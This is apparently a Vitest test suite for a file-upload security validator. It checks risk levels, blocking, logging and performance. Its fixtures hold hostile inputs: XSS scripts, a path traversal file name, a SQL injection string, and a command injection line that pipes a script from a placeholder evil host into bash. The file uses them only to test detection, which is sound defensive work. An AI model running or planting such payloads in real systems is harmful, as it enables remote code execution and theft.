import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { securityLogger } from '../../lib/logger';
import {
  DEFAULT_VALIDATION_CONFIG,
  FileValidatorService,
} from '../../services/file-validator.service';
import { FileData } from '../../types/upload.types';

// Mock the logger
vi.mock('../../lib/logger', () => ({
  securityLogger: {
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
    logSecurityEvent: vi.fn(),
  },
}));

describe('Comprehensive Security Validation', () => {
  let fileValidator: FileValidatorService;

  beforeEach(() => {
    fileValidator = new FileValidatorService({
      ...DEFAULT_VALIDATION_CONFIG,
      enableMalwareScanning: true,
      enableContentValidation: true,
    });
    vi.clearAllMocks();
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  describe('validateFileSecurity', () => {
    it('should pass clean files with low risk', async () => {
      const cleanFile: FileData = {
        buffer: Buffer.from('This is a clean document with normal content.'),
        originalName: 'document.txt',
        mimeType: 'text/plain',
        size: 45,
      };

      const result = await fileValidator.validateFileSecurity(cleanFile);

      expect(result.isSecure).toBe(true);
      expect(result.overallRiskLevel).toBe('low');
      expect(result.shouldBlock).toBe(false);
      expect(result.requiresManualReview).toBe(false);
      expect(result.basicValidation.isValid).toBe(true);
      expect(result.securityScan.isSecure).toBe(true);
    });

    it('should detect and block high-risk malicious files', async () => {
      const maliciousFile: FileData = {
        buffer: Buffer.from(
          '<script>eval(atob("bWFsaWNpb3VzIGNvZGU="))</script><img src="x" onerror="alert(1)">'
        ),
        originalName: 'malicious.html',
        mimeType: 'text/html',
        size: 80,
      };

      const result = await fileValidator.validateFileSecurity(maliciousFile);

      expect(result.isSecure).toBe(false);
      expect(result.overallRiskLevel).toBe('high');
      expect(result.shouldBlock).toBe(true);
      expect(result.requiresManualReview).toBe(true);
      expect(result.securityScan.threats.length).toBeGreaterThan(0);

      // Should have script injection threats
      const scriptThreats = result.securityScan.threats.filter(
        t =>
          t.type === 'injection_attempt' && t.name.includes('Script Injection')
      );
      expect(scriptThreats.length).toBeGreaterThan(0);
    });

    it('should handle files with basic validation errors', async () => {
      const invalidFile: FileData = {
        buffer: Buffer.alloc(0), // Empty buffer
        originalName: '',
        mimeType: 'application/unknown',
        size: 0,
      };

      const result = await fileValidator.validateFileSecurity(invalidFile);

      expect(result.isSecure).toBe(false);
      expect(result.basicValidation.isValid).toBe(false);
      expect(result.basicValidation.errors.length).toBeGreaterThan(0);
      expect(result.overallRiskLevel).toBeOneOf(['medium', 'high']);
      expect(result.shouldBlock).toBe(false); // Basic validation errors don't auto-block unless critical
    });

    it('should flag files with suspicious names for manual review', async () => {
      const suspiciousFile: FileData = {
        buffer: Buffer.from('Normal content'),
        originalName: '../../../etc/passwd',
        mimeType: 'text/plain',
        size: 14,
      };

      const result = await fileValidator.validateFileSecurity(suspiciousFile);

      expect(result.isSecure).toBe(false);
      expect(result.requiresManualReview).toBe(true);

      const filenameThreat = result.securityScan.threats.find(
        t => t.name === 'Insecure File Name'
      );
      expect(filenameThreat).toBeDefined();
    });

    it('should detect SQL injection attempts', async () => {
      const sqlInjectionFile: FileData = {
        buffer: Buffer.from("'; DROP TABLE users; --"),
        originalName: 'data.sql',
        mimeType: 'text/plain',
        size: 23,
      };

      const result = await fileValidator.validateFileSecurity(sqlInjectionFile);

      expect(result.isSecure).toBe(false);
      expect(result.overallRiskLevel).toBe('high');
      expect(result.shouldBlock).toBe(true);

      const sqlThreat = result.securityScan.threats.find(
        t => t.name === 'SQL Injection Pattern'
      );
      expect(sqlThreat).toBeDefined();
      expect(sqlThreat?.severity).toBe('high');
    });

    it('should detect command injection attempts', async () => {
      const commandInjectionFile: FileData = {
        buffer: Buffer.from('$(curl http://evil.com/steal.sh | bash)'),
        originalName: 'script.txt',
        mimeType: 'text/plain',
        size: 40,
      };

      const result =
        await fileValidator.validateFileSecurity(commandInjectionFile);

      expect(result.isSecure).toBe(false);
      expect(result.overallRiskLevel).toBe('high');
      expect(result.shouldBlock).toBe(true);

      const cmdThreat = result.securityScan.threats.find(
        t => t.name === 'Command Injection Pattern'
      );
      expect(cmdThreat).toBeDefined();
    });

    it('should handle polyglot files appropriately', async () => {
      // Create a file that appears to be both JPEG and PDF
      const polyglotBuffer = Buffer.concat([
        Buffer.from([0xff, 0xd8, 0xff, 0xe0]), // JPEG header
        Buffer.from('JFIF'),
        Buffer.from('some content'),
        Buffer.from([0x25, 0x50, 0x44, 0x46, 0x2d]), // PDF header
      ]);

      const polyglotFile: FileData = {
        buffer: polyglotBuffer,
        originalName: 'document.jpg',
        mimeType: 'image/jpeg',
        size: polyglotBuffer.length,
      };

      const result = await fileValidator.validateFileSecurity(polyglotFile);

      expect(result.isSecure).toBe(false);
      expect(result.shouldBlock).toBe(true);

      const polyglotThreat = result.securityScan.threats.find(
        t => t.name === 'Polyglot File Detected'
      );
      expect(polyglotThreat).toBeDefined();
      expect(polyglotThreat?.severity).toBe('high');
    });

    it('should provide appropriate recommendations', async () => {
      const riskyFile: FileData = {
        buffer: Buffer.from('<script>alert("xss")</script>'),
        originalName: 'test.html',
        mimeType: 'text/html',
        size: 29,
      };

      const result = await fileValidator.validateFileSecurity(riskyFile);

      expect(result.recommendations).toContain(
        'HIGH RISK: Consider blocking file upload'
      );
      expect(result.recommendations.length).toBeGreaterThan(0);

      // Should have specific mitigation recommendations
      const hasSpecificMitigation = result.recommendations.some(
        rec =>
          rec.includes('Strip script content') || rec.includes('Block file')
      );
      expect(hasSpecificMitigation).toBe(true);
    });

    it('should log security events appropriately', async () => {
      const testFile: FileData = {
        buffer: Buffer.from('<script>malicious()</script>'),
        originalName: 'test.html',
        mimeType: 'text/html',
        size: 28,
      };

      await fileValidator.validateFileSecurity(testFile, {
        userId: 'test-user',
      });

      // Verify security events were logged
      expect(securityLogger.info).toHaveBeenCalledWith(
        'Starting comprehensive security validation',
        expect.objectContaining({
          fileName: 'test.html',
          fileSize: 28,
          mimeType: 'text/html',
        })
      );

      expect(securityLogger.logSecurityEvent).toHaveBeenCalledWith(
        'comprehensive_security_validation',
        expect.any(String),
        expect.objectContaining({
          fileName: 'test.html',
          isSecure: false,
          shouldBlock: true,
        })
      );
    });

    it('should handle validation errors gracefully', async () => {
      // Create a file that might cause validation errors
      const problematicFile: FileData = {
        buffer: Buffer.from('test'),
        originalName: 'test.txt',
        mimeType: 'text/plain',
        size: 4,
      };

      // Mock an error in the security scanner
      const originalScanFile = fileValidator['securityScanner'].scanFile;
      vi.spyOn(
        fileValidator['securityScanner'],
        'scanFile'
      ).mockRejectedValueOnce(new Error('Scanner unavailable'));

      const result = await fileValidator.validateFileSecurity(problematicFile);

      expect(result.isSecure).toBe(false);
      expect(result.shouldBlock).toBe(true);
      expect(result.requiresManualReview).toBe(true);
      expect(result.overallRiskLevel).toBe('high');
      expect(result.recommendations).toContain('Retry security validation');

      // Verify error was logged
      expect(securityLogger.error).toHaveBeenCalledWith(
        'Security validation failed',
        expect.any(Error),
        expect.objectContaining({
          fileName: 'test.txt',
        })
      );

      // Restore original method
      fileValidator['securityScanner'].scanFile = originalScanFile;
    });

    it('should correctly assess overall risk levels', async () => {
      // Test different combinations of basic validation and security scan results

      // Case 1: Basic validation passes, security scan finds medium risk
      const mediumRiskFile: FileData = {
        buffer: Buffer.from('SELECT * FROM users WHERE active = 1'), // Legitimate SQL
        originalName: 'query.sql',
        mimeType: 'text/plain',
        size: 35,
      };

      const mediumResult =
        await fileValidator.validateFileSecurity(mediumRiskFile);
      expect(mediumResult.overallRiskLevel).toBeOneOf(['low', 'medium']);

      // Case 2: Basic validation fails with non-critical errors
      const basicFailFile: FileData = {
        buffer: Buffer.from('content'),
        originalName:
          'file_with_very_long_name_that_exceeds_normal_limits_and_should_be_truncated_or_rejected_based_on_validation_rules_this_is_intentionally_very_long_to_test_filename_length_validation_functionality_in_the_security_system.txt',
        mimeType: 'text/plain',
        size: 7,
      };

      const basicFailResult =
        await fileValidator.validateFileSecurity(basicFailFile);
      expect(basicFailResult.overallRiskLevel).toBeOneOf(['medium', 'high']);
    });

    it('should handle different file types appropriately', async () => {
      const testCases = [
        {
          name: 'image file',
          file: {
            buffer: Buffer.from([
              0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46,
            ]),
            originalName: 'photo.jpg',
            mimeType: 'image/jpeg',
            size: 10,
          },
        },
        {
          name: 'PDF document',
          file: {
            buffer: Buffer.from([
              0x25, 0x50, 0x44, 0x46, 0x2d, 0x31, 0x2e, 0x34,
            ]),
            originalName: 'document.pdf',
            mimeType: 'application/pdf',
            size: 8,
          },
        },
        {
          name: 'text file',
          file: {
            buffer: Buffer.from('Plain text content'),
            originalName: 'readme.txt',
            mimeType: 'text/plain',
            size: 18,
          },
        },
      ];

      for (const testCase of testCases) {
        const result = await fileValidator.validateFileSecurity(
          testCase.file as FileData
        );

        // All clean files should pass basic validation
        expect(result.basicValidation.isValid).toBe(true);
        expect(result.isSecure).toBe(true);
        expect(result.overallRiskLevel).toBe('low');
      }
    });

    it('should provide context-aware validation', async () => {
      const contextFile: FileData = {
        buffer: Buffer.from('Normal content'),
        originalName: 'upload.txt',
        mimeType: 'text/plain',
        size: 14,
      };

      const uploadContext = {
        userId: 'user123',
        uploadType: 'profile_document',
        ipAddress: '192.168.1.1',
        userAgent: 'Mozilla/5.0...',
      };

      const result = await fileValidator.validateFileSecurity(
        contextFile,
        uploadContext
      );

      expect(result.isSecure).toBe(true);

      // Verify context was passed to security scanner
      expect(securityLogger.info).toHaveBeenCalledWith(
        'Starting comprehensive security validation',
        expect.objectContaining({
          fileName: 'upload.txt',
        })
      );
    });
  });

  describe('risk assessment accuracy', () => {
    it('should correctly identify critical risks', async () => {
      const criticalFile: FileData = {
        buffer: Buffer.from(
          '<script>eval(atob("malicious"))</script><iframe src="javascript:alert(1)"></iframe>'
        ),
        originalName: 'invoice.exe', // Suspicious name
        mimeType: 'text/html',
        size: 80,
      };

      const result = await fileValidator.validateFileSecurity(criticalFile);

      expect(result.overallRiskLevel).toBe('high'); // Should be high due to multiple threats
      expect(result.shouldBlock).toBe(true);
      expect(result.requiresManualReview).toBe(true);
      expect(result.securityScan.threats.length).toBeGreaterThan(1);
    });

    it('should handle edge cases in risk calculation', async () => {
      // File with only low-severity issues
      const lowRiskFile: FileData = {
        buffer: Buffer.alloc(0), // Empty file (low severity)
        originalName: 'empty.txt',
        mimeType: 'text/plain',
        size: 0,
      };

      const result = await fileValidator.validateFileSecurity(lowRiskFile);

      expect(result.overallRiskLevel).toBeOneOf(['low', 'medium']);
      expect(result.shouldBlock).toBe(false);
    });
  });

  describe('performance and scalability', () => {
    it('should handle large files efficiently', async () => {
      const largeFile: FileData = {
        buffer: Buffer.alloc(5 * 1024 * 1024), // 5MB
        originalName: 'large_file.bin',
        mimeType: 'application/octet-stream',
        size: 5 * 1024 * 1024,
      };

      const startTime = Date.now();
      const result = await fileValidator.validateFileSecurity(largeFile);
      const endTime = Date.now();

      expect(endTime - startTime).toBeLessThan(15000); // Should complete within 15 seconds
      expect(result).toBeDefined();
      expect(result.securityScan.scanTime).toBeGreaterThan(0);
    });

    it('should handle concurrent validations', async () => {
      const files: FileData[] = Array.from({ length: 3 }, (_, i) => ({
        buffer: Buffer.from(`Test content ${i}`),
        originalName: `test${i}.txt`,
        mimeType: 'text/plain',
        size: 13 + i.toString().length,
      }));

      const promises = files.map(file =>
        fileValidator.validateFileSecurity(file)
      );
      const results = await Promise.all(promises);

      expect(results).toHaveLength(3);
      results.forEach((result, index) => {
        expect(result.basicValidation.isValid).toBe(true);
        expect(result.securityScan.scanId).toBeDefined();
      });
    });
  });
});
